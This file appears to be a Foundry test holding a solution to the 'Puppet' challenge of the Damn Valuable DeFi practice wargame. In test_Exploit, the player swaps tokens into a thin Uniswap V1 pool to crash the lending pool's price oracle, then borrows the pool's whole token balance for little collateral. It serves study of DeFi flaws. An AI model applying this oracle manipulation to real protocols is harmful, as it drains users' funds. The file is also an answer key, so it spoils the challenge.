// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {PuppetPool} from "src/puppet/PuppetPool.sol";
import {DamnValuableToken} from "src/DamnValuableToken.sol";

interface IUniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

interface IUniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256 out);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        returns (uint256 out);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 out);
}

contract PuppetTest is Test {
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10 ether;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10 ether;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1_000 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25 ether;

    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000 ether;

    address deployer = makeAddr("DEPLOYER");
    address player = makeAddr("PLAYER");

    DamnValuableToken token;
    IUniswapV1Factory uniswapFactory;
    IUniswapV1Exchange uniswapExchange;
    PuppetPool lendingPool;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        vm.warp(1_234_567_890);

        vm.deal(deployer, UNISWAP_INITIAL_ETH_RESERVE);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        vm.startPrank(deployer);

        // Deploy token to be traded in Uniswap
        token = new DamnValuableToken();

        // Deploy a exchange that will be used as the factory template
        bytes memory exchangeBytecode = abi.encodePacked(
            vm.getCode("../lib/build-uniswap-v1:UniswapV1Exchange")
        );
        address exchangeTemplate;
        assembly {
            exchangeTemplate := create(
                0,
                add(exchangeBytecode, 0x20),
                mload(exchangeBytecode)
            )
        }
        vm.label(exchangeTemplate, "ExchangeTemplate");

        // Deploy factory, initializing it with the address of the template exchange
        bytes memory factoryBytecode = abi.encodePacked(
            vm.getCode("../lib/build-uniswap-v1:UniswapV1Factory")
        );
        assembly {
            let addr := create(
                0,
                add(factoryBytecode, 0x20),
                mload(factoryBytecode)
            )
            sstore(uniswapFactory.slot, addr)
        }
        vm.label(address(uniswapFactory), "UniswapFactory");
        uniswapFactory.initializeFactory(address(exchangeTemplate));

        // Create a new exchange for the token, and retreive the deployed exchange's address
        uniswapExchange = IUniswapV1Exchange(
            uniswapFactory.createExchange(address(token))
        );
        vm.label(address(uniswapExchange), "UniswapExchange");

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapExchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0,
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2
        );

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    function test_SetUpState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            _calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        assertEq(lendingPool.calculateDepositRequired(1 ether), 2 ether);
        assertEq(
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
    }

    function test_Exploit() public {
        /**
         * SOLUTION
         */

        vm.startPrank(player);

        console.log("[Before swap]");
        console.log("- Exchange Liquidity");
        console.log(
            "    ETH: %d (%d)",
            address(uniswapExchange).balance,
            address(uniswapExchange).balance / 10**18
        );
        console.log(
            "    DVT: %d (%d)",
            token.balanceOf(address(uniswapExchange)),
            token.balanceOf(address(uniswapExchange)) / 10**18
        );
        console.log(
            "- Lending pool deposit required: %d (%d)\n",
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) /
                10**18
        );

        token.approve(address(uniswapExchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1 ether,
            block.timestamp * 2
        );

        console.log("[After swap]");
        console.log("- Exchange Liquidity");
        console.log(
            "    ETH: %d (%d)",
            address(uniswapExchange).balance,
            address(uniswapExchange).balance / 10**18
        );
        console.log(
            "    DVT: %d (%d)",
            token.balanceOf(address(uniswapExchange)),
            token.balanceOf(address(uniswapExchange)) / 10**18
        );
        console.log(
            "- Lending pool deposit required: %d (%d)\n",
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) /
                10**18
        );

        lendingPool.borrow{value: PLAYER_INITIAL_ETH_BALANCE}(
            POOL_INITIAL_TOKEN_BALANCE,
            player
        );

        vm.stopPrank();

        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */

        // Player executed a single transaction
        // assertEq(vm.getNonce(player), 1);

        // Player has taken all tokens from the pool
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Pool still has tokens"
        );
        assertGe(
            token.balanceOf(player),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough token balance in player"
        );
    }

    function _calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) private pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }
}
